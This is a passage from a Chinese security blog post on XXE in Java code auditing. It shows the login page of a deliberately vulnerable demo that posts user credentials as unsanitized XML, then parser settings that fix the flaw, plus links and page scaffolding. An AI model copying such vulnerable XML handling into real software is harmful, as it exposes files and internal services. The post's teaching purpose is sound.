/&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot; /&gt;</span><br><span class="line"></span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/font.css&quot; /&gt;</span><br><span class="line">	&lt;link href=&quot;css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; /&gt;</span><br><span class="line">	&lt;link href=&quot;css/material-bootstrap-wizard.css&quot; rel=&quot;stylesheet&quot; /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;image-container set-full-height&quot; style=&quot;background-color: #272822;&quot;&gt;</span><br><span class="line">	    &lt;!--   Creative Tim Branding   --&gt;</span><br><span class="line">	    &lt;!--   Big container   --&gt;</span><br><span class="line">	    &lt;div class=&quot;container&quot; style=&quot;width: 970px;&quot;&gt;</span><br><span class="line">	        &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">		        &lt;div class=&quot;col-sm-8 col-sm-offset-2&quot;&gt;</span><br><span class="line">		            &lt;!--      Wizard container        --&gt;</span><br><span class="line">		            &lt;div class=&quot;wizard-container&quot;&gt;</span><br><span class="line">		                &lt;div class=&quot;card wizard-card&quot; data-color=&quot;green&quot; id=&quot;wizardProfile&quot;&gt;</span><br><span class="line">		                    &lt;form&gt;</span><br><span class="line">		                    	&lt;div class=&quot;wizard-header&quot;&gt;</span><br><span class="line">		                        	&lt;h3 class=&quot;wizard-title&quot;&gt; DOM Read XML &lt;/h3&gt;</span><br><span class="line">									</span><br><span class="line">		                    	&lt;/div&gt;</span><br><span class="line">								&lt;div class=&quot;wizard-navigation&quot;&gt;</span><br><span class="line">									&lt;ul&gt;</span><br><span class="line">			                            &lt;li&gt;&lt;a href=&quot;#about&quot; data-toggle=&quot;tab&quot;&gt;tips:&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">			                            &lt;li&gt;&lt;a href=&quot;javascript:void(0)&quot; &gt;&lt;span style=&quot;color:red;&quot; class=&quot;msg&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">										&lt;li&gt;&lt;a href=&quot;javascript:void(0)&quot;&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">			                        &lt;/ul&gt;</span><br><span class="line">								&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">		                        &lt;div class=&quot;tab-content&quot;&gt;</span><br><span class="line">		                            &lt;div class=&quot;tab-pane&quot; id=&quot;about&quot;&gt;</span><br><span class="line">		                              &lt;div class=&quot;row&quot;&gt;</span><br><span class="line">		                                	&lt;div class=&quot;col-sm-6&quot;&gt;</span><br><span class="line">												&lt;div class=&quot;input-group&quot; style=&quot;margin-left: 30%;&quot;&gt;</span><br><span class="line">													&lt;span class=&quot;input-group-addon&quot;&gt;</span><br><span class="line">														&lt;i class=&quot;iconfont icon-icon30&quot; style=&quot;font-size:25px;&quot;&gt;&lt;/i&gt;</span><br><span class="line">													&lt;/span&gt;</span><br><span class="line">													&lt;div class=&quot;form-group label-floating&quot;&gt;</span><br><span class="line">			                                          &lt;label class=&quot;control-label&quot;&gt;UserName&lt;/label&gt;</span><br><span class="line">			                                          &lt;input id=&quot;username&quot; name=&quot;username&quot; style=&quot;width: 200%;&quot; type=&quot;text&quot; class=&quot;form-control&quot;&gt;</span><br><span class="line">			                                        &lt;/div&gt;</span><br><span class="line">												&lt;/div&gt;</span><br><span class="line">												&lt;div class=&quot;input-group&quot; style=&quot;margin-left: 30%;&quot;&gt;</span><br><span class="line">													&lt;span class=&quot;input-group-addon&quot;&gt;</span><br><span class="line">														&lt;i class=&quot;iconfont icon-mima&quot; style=&quot;font-size:25px;&quot;&gt;&lt;/i&gt;</span><br><span class="line">													&lt;/span&gt;</span><br><span class="line">													&lt;div class=&quot;form-group label-floating&quot;&gt;</span><br><span class="line">													  &lt;label class=&quot;control-label&quot;&gt;Password&lt;/label&gt;</span><br><span class="line">													  &lt;input id=&quot;password&quot; name=&quot;password&quot; style=&quot;width: 200%;&quot; type=&quot;password&quot; class=&quot;form-control&quot;&gt;</span><br><span class="line">													&lt;/div&gt;</span><br><span class="line">												&lt;/div&gt;</span><br><span class="line">		                                	&lt;/div&gt;</span><br><span class="line">		                            	&lt;/div&gt;</span><br><span class="line">		                            &lt;/div&gt;</span><br><span class="line">		                            </span><br><span class="line">		                            </span><br><span class="line">		                        &lt;/div&gt;</span><br><span class="line">		                        &lt;div class=&quot;wizard-footer&quot;&gt;</span><br><span class="line">		                            &lt;div class=&quot;pull-right&quot;&gt;</span><br><span class="line">		                                &lt;input type=&apos;button&apos; class=&apos;btn btn-fill btn-success btn-wd&apos; name=&apos;next&apos; value=&apos;login&apos; onclick=&quot;javascript:doLogin()&quot; /&gt;</span><br><span class="line">		                            &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">		                            &lt;div class=&quot;clearfix&quot;&gt;&lt;/div&gt;</span><br><span class="line">		                        &lt;/div&gt;</span><br><span class="line">		                    &lt;/form&gt;</span><br><span class="line">		                &lt;/div&gt;</span><br><span class="line">		            &lt;/div&gt; &lt;!-- wizard container --&gt;</span><br><span class="line">		        &lt;/div&gt;</span><br><span class="line">	        &lt;/div&gt;&lt;!-- end row --&gt;</span><br><span class="line">	    &lt;/div&gt; &lt;!--  big container --&gt;</span><br><span class="line"></span><br><span class="line">	    &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">	        &lt;div class=&quot;container text-center&quot;&gt;</span><br><span class="line">	             </span><br><span class="line">	        &lt;/div&gt;</span><br><span class="line">	    &lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!--   Core JS Files   --&gt;</span><br><span class="line">&lt;script src=&quot;js/jquery-2.2.4.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;js/bootstrap.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;js/jquery.bootstrap.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--  Plugin for the Wizard --&gt;</span><br><span class="line">&lt;script src=&quot;js/material-bootstrap-wizard.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;js/jquery.validate.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&apos;text/javascript&apos;&gt; </span><br><span class="line">function doLogin()&#123;</span><br><span class="line">	var username = $(&quot;#username&quot;).val();</span><br><span class="line">	var password = $(&quot;#password&quot;).val();</span><br><span class="line">	if(username == &quot;&quot; || password == &quot;&quot;)&#123;</span><br><span class="line">		alert(&quot;Please enter the username and password!&quot;);</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        url: &quot;doLogin1&quot;,</span><br><span class="line">        contentType: &quot;application/xml;charset=utf-8&quot;,</span><br><span class="line">        data: data,</span><br><span class="line">        dataType: &quot;xml&quot;,</span><br><span class="line">        anysc: false,</span><br><span class="line">        success: function (result) &#123;</span><br><span class="line">        	var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line">        	var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line">        	if(code == &quot;0&quot;)&#123;</span><br><span class="line">        		$(&quot;.msg&quot;).text(msg + &quot; login fail!-DOM&quot;);</span><br><span class="line">        	&#125;else if(code == &quot;1&quot;)&#123;</span><br><span class="line">        		$(&quot;.msg&quot;).text(msg + &quot; login success!-DOM&quot;);</span><br><span class="line">        	&#125;else&#123;</span><br><span class="line">        		$(&quot;.msg&quot;).text(&quot;error:&quot; + msg);</span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function (XMLHttpRequest,textStatus,errorThrown) &#123;</span><br><span class="line">            $(&quot;.msg&quot;).text(errorThrown + &apos;:&apos; + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>修复方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); </span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);		</span><br><span class="line">dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br></pre></td></tr></table></figure></p>
+<p>完整文章参考<a href="https://xz.aliyun.com/t/2761" target="_blank" rel="noopener">JAVA代码审计之XXE与SSRF</a></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/pplsec/JavaVul/tree/master/MyXXE" target="_blank" rel="noopener">JavaVul</a></p>
+<p><a href="https://xz.aliyun.com/t/2761" target="_blank" rel="noopener">JAVA代码审计之XXE与SSRF</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    <div>
+      
+        
+
+
+      
+    </div>
+    
+
+    
+      
+    
+    
+      <div>
+        <div id="reward-container">
+  <div></div>
+  <button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+
+    
+      
+      
+        
+      
+      <div style="display: inline-block">
+        <img src="/images/wechatpay.png" alt="My0Tang 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XXE/" rel="tag"><i class="fa fa-tag"></i> XXE</a>
+          
+            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+          
+            <a href="/tags/Java/" rel="tag"><i class="fa fa-tag"></i> Java</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/16/Internet-Explorer-XXE-漏洞复现/" rel="next" title="Internet Explorer XXE 漏洞复现">
+                <i class="fa fa-chevron-left"></i> Internet Explorer XXE 漏洞复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/tx.jpg" alt="My0Tang">
+            
+              <p class="site-author-name" itemprop="name">My0Tang</p>
+              <div class="site-description motion-element" itemprop="description">Technology - never stop</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/My0Tang" title="GitHub &rarr; https://github.com/My0Tang" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:luc98414@foxmail.com" title="E-Mail &rarr; mailto:luc98414@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/Lucifer82152738" title="Twitter &rarr; https://twitter.com/Lucifer82152738" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE"><span class="nav-number">1.</span> <span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE漏洞简介"><span class="nav-number">1.1.</span> <span class="nav-text">XXE漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE相关基础概念"><span class="nav-number">1.2.</span> <span class="nav-text">XXE相关基础概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE审计函数"><span class="nav-number">1.3.</span> <span class="nav-text">XXE审计函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用测试POC"><span class="nav-number">1.4.</span> <span class="nav-text">常用测试POC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC1-外部普通实体"><span class="nav-number">1.4.1.</span> <span class="nav-text">POC1-外部普通实体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC2-外部参数实体"><span class="nav-number">1.4.2.</span> <span class="nav-text">POC2-外部参数实体</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE漏洞代码示例"><span class="nav-number">1.5.</span> <span class="nav-text">XXE漏洞代码示例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Dom读取XML"><span class="nav-number">1.5.1.</span> <span class="nav-text">Dom读取XML</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">2.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">My0Tang</span>
+
+</div>
+<div class="copyright">
+  
+
+  
+</div>
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color="0,0,0" opacity="0.5" zindex="-1" count="150" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+  
+
+<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>
+
+
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: true,
+    notify: true,
+    appId: 'e97ENoIwtQd89hKkkt6tF0c0-gzGzoHsz',
+    appKey: 'gfxMNq5twXsHkXG4GfvnMrMc',
+    placeholder: 'ヾﾉ≧∀≦)o 来呀！快活呀！~',
+    avatar: 'mp',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: true,
+    lang: 'zh-cn' || 'zh-cn'
+  });
+</script>
+
+
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "./public/search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('-1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
